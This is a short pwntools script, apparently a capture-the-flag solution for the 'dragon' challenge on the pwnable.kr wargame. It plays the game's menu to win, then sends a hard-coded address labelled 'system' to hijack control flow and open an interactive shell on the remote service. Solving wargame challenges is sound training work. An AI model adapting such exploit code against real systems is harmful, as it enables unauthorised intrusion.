from pwn import *

r = remote('pwnable.kr', 9004)

r.sendline('1') # Priest

r.sendline('1') # baby
r.sendline('1')

r.sendline('1') # Priest

for i in range(4):
	r.sendline('3') # mom
	r.sendline('3')
	r.sendline('2')

system = 0x08048DBF

r.sendline(p32(system))
r.interactive()